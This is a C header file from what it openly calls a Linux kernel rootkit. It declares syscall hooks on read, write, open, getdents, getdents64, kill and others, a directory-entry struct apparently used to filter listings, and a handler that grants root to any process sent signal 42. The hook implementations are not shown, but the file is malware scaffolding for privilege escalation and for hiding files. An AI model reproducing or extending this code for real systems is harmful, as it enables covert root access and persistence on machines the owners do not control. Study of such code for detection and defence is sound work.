#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include "hooking.h"
#include "macro-utils.h"
#include "utils.h"

#define P_SYSCALL_HOOKS  (p_syscall_hooks)
#define NR_SYSCALL_HOOKS (ARRAY_SIZE(P_SYSCALL_HOOKS))

#define SIGNAL_ROOT 42 // The signal to send to elevate the current process to root

/**
 * Defines how to name a syscall hook handler function.
 * The function name is `_new_<syscall_name>_handler`.
 *
 * @param _syscall_name The syscall name
 * @return The hook handler function name
 */
#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler

// Array of the original syscall function references.
sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };

/**
 * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
 * This is used to parse the output of the `getdents` syscall.
 */
struct linux_dirent {
    unsigned long d_ino;     // Inode number
    unsigned long d_off;     // Offset to next linux_dirent
    unsigned short d_reclen; // Length of this linux_dirent
    char d_name[];           // Filename (null-terminated)
};

INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
                   getpid, kill)

// Define signal handler array
signal_handler_t p_signal_hooks[] = {
    NEW_SIGNAL_HANDLER(-1, SIGNAL_ROOT, give_root),
};

#endif
